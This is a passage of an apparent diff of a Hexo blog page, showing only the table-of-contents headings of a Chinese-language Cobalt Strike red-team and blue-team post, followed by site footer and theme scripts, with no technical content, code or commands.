href="#office%E5%AE%8F%E7%97%85%E6%AF%92"><span class="nav-number">3.1.2.</span> <span class="nav-text">office宏病毒</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Payload%E7%94%9F%E6%88%90%E5%99%A8"><span class="nav-number">3.1.3.</span> <span class="nav-text">Payload生成器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="nav-number">3.1.4.</span> <span class="nav-text">Windows可执行程序</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web%E9%92%93%E9%B1%BC"><span class="nav-number">3.2.</span> <span class="nav-text">Web钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC"><span class="nav-number">3.3.</span> <span class="nav-text">邮件钓鱼</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Interactive-session-%E4%BA%A4%E4%BA%92%E4%BC%9A%E8%AF%9D"><span class="nav-number">4.</span> <span class="nav-text">Interactive session-交互会话</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Beacon"><span class="nav-number">4.1.</span> <span class="nav-text">Beacon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spawn-%E6%B4%BE%E7%94%9F"><span class="nav-number">4.2.</span> <span class="nav-text">Spawn 派生</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-Beacon-%E5%92%8C-HTTPS-Beacon"><span class="nav-number">4.2.1.</span> <span class="nav-text">HTTP Beacon 和 HTTPS Beacon</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-%E4%B8%8A%E7%BA%BF"><span class="nav-number">4.3.</span> <span class="nav-text">DNS 上线</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-Beacon"><span class="nav-number">4.3.1.</span> <span class="nav-text">DNS Beacon</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-beacon"><span class="nav-number">4.4.</span> <span class="nav-text">SMB beacon</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Browsing-probe-%E6%B5%8F%E8%A7%88%E6%8E%A2%E6%B5%8B"><span class="nav-number">5.</span> <span class="nav-text">Browsing probe-浏览探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%AA%E5%9B%BE"><span class="nav-number">5.1.</span> <span class="nav-text">截图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">5.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%B5%8F%E8%A7%88"><span class="nav-number">5.3.</span> <span class="nav-text">文件浏览</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E6%8E%A2%E6%B5%8B"><span class="nav-number">5.4.</span> <span class="nav-text">网络探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="nav-number">5.5.</span> <span class="nav-text">进程列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86"><span class="nav-number">5.6.</span> <span class="nav-text">浏览器代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VNC%E4%BA%A4%E4%BA%92"><span class="nav-number">5.7.</span> <span class="nav-text">VNC交互</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Proxy-forwarding-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="nav-number">6.</span> <span class="nav-text">Proxy forwarding-代理转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Socks%E4%BB%A3%E7%90%86"><span class="nav-number">6.1.</span> <span class="nav-text">Socks代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF"><span class="nav-number">6.2.</span> <span class="nav-text">转发上线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VPN%E9%83%A8%E7%BD%B2"><span class="nav-number">6.3.</span> <span class="nav-text">VPN部署</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Beacon-conversation-%E4%BF%A1%E6%A0%87%E4%BC%9A%E8%AF%9D"><span class="nav-number">7.</span> <span class="nav-text">Beacon conversation-信标会话</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%BB%BA%E4%BC%9A%E8%AF%9D"><span class="nav-number">7.1.</span> <span class="nav-text">新建会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E8%8E%B7%E5%8F%96%E4%BC%9A%E8%AF%9D"><span class="nav-number">7.2.</span> <span class="nav-text">注入进程获取会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B4%BE%E7%94%9F%E4%BC%9A%E8%AF%9D%E5%88%B0MSF"><span class="nav-number">7.3.</span> <span class="nav-text">派生会话到MSF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF%E6%B4%BE%E7%94%9F%E4%BC%9A%E8%AF%9D%E5%88%B0CS"><span class="nav-number">7.4.</span> <span class="nav-text">MSF派生会话到CS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#After-penetration-%E5%90%8E%E6%B8%97%E9%80%8F"><span class="nav-number">8.</span> <span class="nav-text">After penetration-后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8F%96Hash"><span class="nav-number">8.1.</span> <span class="nav-text">抓取Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">8.2.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">8.3.</span> <span class="nav-text">伪造黄金票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E4%BB%A4%E7%89%8C"><span class="nav-number">8.4.</span> <span class="nav-text">创建令牌</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poweshell%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="nav-number">8.5.</span> <span class="nav-text">Poweshell一句话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="nav-number">8.6.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE"><span class="nav-number">8.7.</span> <span class="nav-text">屏幕截图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87"><span class="nav-number">8.8.</span> <span class="nav-text">获取明文</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lateral-penetration-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">9.</span> <span class="nav-text">Lateral penetration-横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">9.1.</span> <span class="nav-text">横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#psexec"><span class="nav-number">9.1.1.</span> <span class="nav-text">psexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WMI"><span class="nav-number">9.1.2.</span> <span class="nav-text">WMI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH"><span class="nav-number">9.1.3.</span> <span class="nav-text">SSH</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">10.</span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AA%83%E5%8F%96%E4%BB%A4%E7%89%8C"><span class="nav-number">10.1.</span> <span class="nav-text">窃取令牌</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C%E4%BB%A4%E7%89%8C"><span class="nav-number">10.2.</span> <span class="nav-text">制作令牌</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-1"><span class="nav-number">10.3.</span> <span class="nav-text">伪造黄金票据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C2-Puddle-attack-C2%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB"><span class="nav-number">11.</span> <span class="nav-text">C2 Puddle attack-C2水坑攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8"><span class="nav-number">11.1.</span> <span class="nav-text">制作免杀后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BArar%E8%87%AA%E8%A7%A3%E5%8E%8B"><span class="nav-number">11.2.</span> <span class="nav-text">创建rar自解压</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BAFLASH%E9%92%93%E9%B1%BC"><span class="nav-number">11.3.</span> <span class="nav-text">搭建FLASH钓鱼</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C2-Hiding-technology-C2%E9%9A%90%E8%97%8F"><span class="nav-number">12.</span> <span class="nav-text">C2 Hiding technology-C2隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%9A%90%E8%97%8FC2"><span class="nav-number">12.1.</span> <span class="nav-text">Nginx反向代理隐藏C2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CDN%E8%BD%AC%E5%8F%91%E6%8A%80%E6%9C%AF%E9%9A%90%E8%97%8FC2"><span class="nav-number">12.2.</span> <span class="nav-text">CDN转发技术隐藏C2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF%E9%9A%90%E8%97%8FC2"><span class="nav-number">12.3.</span> <span class="nav-text">域前置技术隐藏C2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E6%8A%80%E6%9C%AF%E9%9A%90%E8%97%8FC2"><span class="nav-number">12.4.</span> <span class="nav-text">重定向技术隐藏C2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%91%E5%87%BD%E6%95%B0%E6%8A%80%E6%9C%AF%E9%9A%90%E8%97%8FC2"><span class="nav-number">12.5.</span> <span class="nav-text">云函数技术隐藏C2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Communication-extension-%E9%80%9A%E4%BF%A1%E6%89%A9%E5%B1%95"><span class="nav-number">13.</span> <span class="nav-text">Communication extension-通信扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0"><span class="nav-number">13.1.</span> <span class="nav-text">相关文章</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Profile-%E8%B5%84%E6%BA%90"><span class="nav-number">13.2.</span> <span class="nav-text">Profile 资源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Malleable-C2"><span class="nav-number">13.3.</span> <span class="nav-text">Malleable C2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#profile-%E8%AF%AD%E6%B3%95"><span class="nav-number">13.4.</span> <span class="nav-text">profile 语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C2-Sample-rule-%E6%A0%B7%E6%9C%AC%E8%A7%84%E5%88%99"><span class="nav-number">14.</span> <span class="nav-text">C2 Sample rule-样本规则</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8C%B9%E9%85%8DCobaltStrike%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC"><span class="nav-number">14.1.</span> <span class="nav-text">匹配CobaltStrike恶意样本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Scripting-extensions-%E8%84%9A%E6%9C%AC%E6%8B%93%E5%B1%95"><span class="nav-number">15.</span> <span class="nav-text">Scripting extensions-脚本拓展</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CNA-%E6%89%A9%E5%B1%95"><span class="nav-number">15.1.</span> <span class="nav-text">CNA 扩展</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CrossC2%E4%B8%8A%E7%BA%BFLinux"><span class="nav-number">15.2.</span> <span class="nav-text">CrossC2上线Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90-rebind-%E5%BA%93"><span class="nav-number">15.3.</span> <span class="nav-text">生成 rebind 库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90-shell"><span class="nav-number">15.4.</span> <span class="nav-text">直接生成 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%94%9F%E6%88%90-shell"><span class="nav-number">15.5.</span> <span class="nav-text">域前置模式下生成 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5-cna"><span class="nav-number">15.6.</span> <span class="nav-text">导入 cna</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mac%E4%B8%8A%E7%BA%BF"><span class="nav-number">15.7.</span> <span class="nav-text">Mac上线</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blue-team-counter-%E8%93%9D%E9%98%9F%E5%8F%8D%E5%88%B6"><span class="nav-number">16.</span> <span class="nav-text">Blue team counter-蓝队反制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90"><span class="nav-number">16.1.</span> <span class="nav-text">服务端特征分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#beacon%E6%A3%80%E6%B5%8B"><span class="nav-number">16.2.</span> <span class="nav-text">beacon检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#beacon%E5%88%86%E6%9E%90"><span class="nav-number">16.3.</span> <span class="nav-text">beacon分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BF%E5%8C%85%E5%B9%B2%E6%89%B0"><span class="nav-number">16.4.</span> <span class="nav-text">上线包干扰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4-cobaltstrike-teamserver-%E5%AF%86%E7%A0%81"><span class="nav-number">16.5.</span> <span class="nav-text">爆破 cobaltstrike teamserver 密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL%E8%9C%9C%E7%BD%90%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">16.6.</span> <span class="nav-text">MySQL蜜罐读取配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2022-39197"><span class="nav-number">16.7.</span> <span class="nav-text">CVE-2022-39197</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%81%E8%B7%AF%E5%8F%8D%E5%88%B6"><span class="nav-number">16.8.</span> <span class="nav-text">旁路反制</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">IcMl0x24</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br> 
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v1.2.1</a>
+        </div>
+        
+        
+        
+            <div id="start_time_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="unfolded-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="folded-tools-list">
+        <li class="right-bottom-tools tool-toggle-show flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/menu-shrink.js"></script>
+
+<script src="/js/tools/go-top-bottom.js"></script>
+
+<script src="/js/tools/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/code-block.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/layouts/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
